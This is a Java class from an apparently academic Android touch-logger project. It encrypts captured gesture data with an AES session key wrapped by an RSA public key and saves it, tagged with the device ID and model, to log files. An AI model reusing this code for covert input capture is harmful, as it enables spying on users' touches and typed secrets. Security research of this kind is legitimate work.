package org.leyfer.thesis.touchlogger_dirty.task;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Base64;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import org.leyfer.thesis.touchlogger_dirty.pojo.GestureReport;
import org.leyfer.thesis.touchlogger_dirty.pojo.Gestures;
import org.leyfer.thesis.touchlogger_dirty.utils.crypto.CryptoUtils;
import org.leyfer.thesis.touchlogger_dirty.utils.crypto.SymmetricEncryptionResult;
import org.leyfer.thesis.touchlogger_dirty.utils.file.FileUtils;

import java.io.File;
import java.nio.ByteBuffer;
import java.util.Locale;

import javax.crypto.SecretKey;

public class SaveGesturesTask extends AsyncTask<Gestures, Void, Void> {

    private final File logDataDirectory;
    private final String deviceId;

    public SaveGesturesTask(File logDataDirectory, String deviceId) {
        this.logDataDirectory = logDataDirectory;
        this.deviceId = deviceId;
    }

    @Override
    protected Void doInBackground(Gestures... gesturesList) {
        if (!logDataDirectory.exists() && !logDataDirectory.mkdirs()) {
            throw new RuntimeException(String.format("Unable to create folder \"%s\"!",
                    logDataDirectory.getAbsolutePath()));
        }

        String deviceModel = String.format("%s,%s,%s,%s",
                Build.MANUFACTURER, Build.BRAND, Build.BOARD, Build.MODEL);

        SecretKey sessionKey = CryptoUtils.generateAESKey();

        byte[] encryptedSessionKeyBytes = CryptoUtils.encryptRSA(
                CryptoUtils.getPublicKey(), sessionKey.getEncoded());

        String encryptedSessionKey = Base64.encodeToString(
                encryptedSessionKeyBytes, Base64.NO_WRAP);

        for (Gestures gesturesItem : gesturesList) {
            long millis = System.currentTimeMillis();
            String filename = String.format(Locale.getDefault(), "data_%d.log", millis);

            byte[] touchData;
            try {
                touchData = new ObjectMapper().writeValueAsBytes(gesturesItem);
            } catch (JsonProcessingException e) {
                throw new RuntimeException("Invalid object mapping!", e);
            }

            SymmetricEncryptionResult result = CryptoUtils.
                    encryptAES(sessionKey, touchData);

            String IV = Base64.encodeToString(result.getIV(), Base64.NO_WRAP);
            String encryptedData = Base64.encodeToString(
                    result.getEncryptedData(), Base64.NO_WRAP);

            GestureReport report = new GestureReport(deviceId, deviceModel,
                    encryptedSessionKey, IV, encryptedData);

            try {
                ByteBuffer reportData = ByteBuffer.wrap(
                        new ObjectMapper().writeValueAsBytes(report));
                File outputFile = new File(logDataDirectory, filename);
                FileUtils.writeDataToFile(reportData, outputFile);
            } catch (JsonProcessingException e) {
                throw new RuntimeException("Unable to serialize report!", e);
            }

            if (isCancelled()) {
                break;
            }
        }

        return null;
    }
}
